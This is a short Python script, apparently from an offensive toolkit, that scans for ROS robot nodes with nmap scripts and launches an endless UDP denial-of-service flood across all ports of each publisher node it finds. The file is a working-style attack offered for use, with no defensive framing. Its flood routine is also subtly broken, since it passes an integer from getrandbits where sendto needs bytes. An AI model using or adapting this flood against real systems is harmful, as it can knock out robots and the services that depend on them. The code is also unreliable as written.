import random
import socket

from core import Node
from recon import scan_node


def dos(target_node: Node):
    """
    Spam a node with random data to all ports
    :param target_node: Node to attack
    :return:
    """
    port = 1
    ip_addr = target_node.ip_addr
    data = random.getrandbits(4096)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        s.sendto(data, (ip_addr, port))
        port = port + 1
        if port == 65534:
            port = 1


if __name__ == "__main__":
    node_list = scan_node.scan_host('127.0.0.1', '1-', ['ros-master-scan.nse', 'ros-node-id.nse'])
    for node in node_list:
        if "Publisher" in node.notes:
            target = node
            dos(target)
